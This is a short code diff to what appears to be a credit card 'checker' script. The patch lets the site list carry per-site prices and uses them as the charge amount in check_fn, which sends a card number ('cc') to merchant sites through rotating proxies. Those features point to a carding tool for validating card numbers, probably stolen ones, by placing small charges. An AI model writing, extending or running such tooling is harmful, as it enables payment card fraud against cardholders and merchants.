@@ -46,10 +46,29 @@ _site_ctr = itertools.count()
 _proxy_ctr = itertools.count()
 
 
+_SITE_PRICES = {}
+
+
 def load_sites():
+    global _SITE_PRICES
     try:
         with open(SITES_FILE, encoding="utf-8") as f:
-            return [l.strip() for l in f if l.strip().startswith("http")]
+            sites = []
+            for l in f:
+                l = l.strip()
+                if not l.startswith("http"):
+                    continue
+                if "|" in l:
+                    url, price = l.split("|", 1)
+                    url = url.strip()
+                    try:
+                        _SITE_PRICES[_site_key(url)] = int(price) * 100
+                    except Exception:
+                        pass
+                    sites.append(url)
+                else:
+                    sites.append(l)
+            return sites
     except Exception:
         return []
 
@@ -302,7 +321,7 @@ def check_fn(card):
                 continue
             return "ERROR", "All proxies unavailable — try later", "UNKNOWN", 0
         try:
-            amount = _amount_override or random.randint(23, 100) * 100  # ₹23-100 whole rupees
+            amount = _amount_override or _SITE_PRICES.get(_site_key(site)) or random.randint(23, 100) * 100
             q = urllib.parse.urlencode({
                 "cc": card,
                 "site": site,
